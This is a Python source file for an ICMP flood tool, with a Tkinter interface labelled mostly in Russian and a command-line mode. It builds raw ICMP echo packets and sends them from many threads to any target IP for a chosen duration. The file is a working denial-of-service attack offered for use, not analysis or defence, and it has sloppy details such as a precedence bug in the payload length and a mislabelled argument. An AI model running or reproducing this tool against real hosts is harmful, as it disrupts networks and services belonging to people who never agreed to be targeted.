import subprocess
import threading
import tkinter as tk
from tkinter import ttk
import time
import argparse
import socket
import struct

class ICMPFloodAttack:
    def __init__(self):
        self.stop_event = threading.Event()
        self.threads = []
        self.timeout_timer = None

    def send_ping(self, ip_dest, duration, packet_size):
        end_time = time.time() + duration
        while not self.stop_event.is_set() and time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = self.create_icmp_packet(packet_size)
            sock.sendto(packet, (ip_dest, 0))
            time.sleep(0.01)  # Add a small delay to avoid flooding

    def create_icmp_packet(self, packet_size):
        header = struct.pack('!BBHHH', 8, 0, 0, 100, 1)
        data = (b'ABCDEFGHIJKLMNOPQRSTUVWX' * (packet_size - 7 // 24 + 1))[:packet_size - 7]
        cksum = self.calculate_checksum(header + data)
        header = struct.pack('!BBHHH', 8, 0, cksum, 100, 1)
        return header + data

    def calculate_checksum(self, data):
        checksum = 0
        countTo = (len(data) // 2) * 2

        for count in range(0, countTo, 2):
            thisVal = data[count + 1] * 256 + data[count]
            checksum = checksum + thisVal
            checksum = checksum & 0xffffffff

        if countTo < len(data):
            checksum = checksum + data[countTo]
            checksum = checksum & 0xffffffff

        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum = checksum + (checksum >> 16)
        checksum = ~checksum
        checksum = checksum & 0xffff
        checksum = checksum >> 8 | (checksum << 8 & 0xff00)

        return checksum

    def start_attack(self, ip_dest, duration, packet_size, num_threads):
        # Инициализация значений
        self.stop_event.clear()
        self.threads = []

        # Запуск атаки в нескольких потоках
        for _ in range(num_threads):
            thread = threading.Thread(target=self.send_ping, args=(ip_dest, duration, packet_size))
            self.threads.append(thread)
            thread.start()

        # Инициализация таймера
        self.timeout_timer = threading.Timer(duration, self.stop_attack)
        self.timeout_timer.start()

        status_label.config(text='Running...')
        start_button.config(text='Остановить атаку', command=self.stop_attack, state=tk.NORMAL)

    def stop_attack(self):
        if self.timeout_timer and self.timeout_timer.is_alive():
            self.timeout_timer.cancel()  # Остановка таймера
        self.stop_event.set()
        status_label.config(text='Attack stopped.')
        start_button.config(text='Запустить атаку', command=self.start_button_command, state=tk.NORMAL)

    def start_button_command(self):
        self.start_attack(ip_entry.get(), int(duration_entry.get()), int(size_entry.get()), int(threads_entry.get()))

    def main(self):
        global ip_entry, duration_entry, size_entry, threads_entry, status_label, start_button

        root = tk.Tk()
        root.title("ICMP Flood Attack")

        frame = ttk.Frame(root, padding="10")
        frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        ttk.Label(frame, text="IP-адрес атакуемого хоста:").grid(column=0, row=0, sticky=tk.W)
        ip_entry = ttk.Entry(frame, width=15)
        ip_entry.grid(column=1, row=0, sticky=tk.W)

        ttk.Label(frame, text="Продолжительность атаки (с):").grid(column=0, row=1, sticky=tk.W)
        duration_entry = ttk.Entry(frame, width=15)
        duration_entry.grid(column=1, row=1, sticky=tk.W)

        ttk.Label(frame, text="Размер пакета (байт):").grid(column=0, row=2, sticky=tk.W)
        size_entry = ttk.Entry(frame, width=15)
        size_entry.grid(column=1, row=2, sticky=tk.W)

        ttk.Label(frame, text="Количество потоков:").grid(column=0, row=3, sticky=tk.W)
        threads_entry = ttk.Entry(frame, width=15)
        threads_entry.grid(column=1, row=3, sticky=tk.W)

        start_button = ttk.Button(frame, text='Запустить атаку', command=self.start_button_command)
        start_button.grid(column=0, row=4, columnspan=2, pady=10)

        status_label = ttk.Label(frame, text='')
        status_label.grid(column=0, row=6, columnspan=2)

        root.mainloop()

if __name__ == '__main__':
    icmp_flood_attack = ICMPFloodAttack()

    parser = argparse.ArgumentParser(description="ICMP Request Generator")
    parser.add_argument("-target", type=str, help="Target IP address")
    parser.add_argument("-duration", type=int, default=1, help="Timeout in seconds (default: 1)")
    parser.add_argument("-size", type=int, default=64, help="Timeout in seconds (default: 1)")
    parser.add_argument("-threads", type=int, default=1, help="Number of threads (default: 1)")
    args = parser.parse_args()

    target_ip = args.target
    duration = args.duration
    packet_size = args.size
    num_threads = args.threads

    if target_ip:
        icmp_flood_attack.start_attack(target_ip, duration, packet_size, num_threads)
    else:
        icmp_flood_attack.main()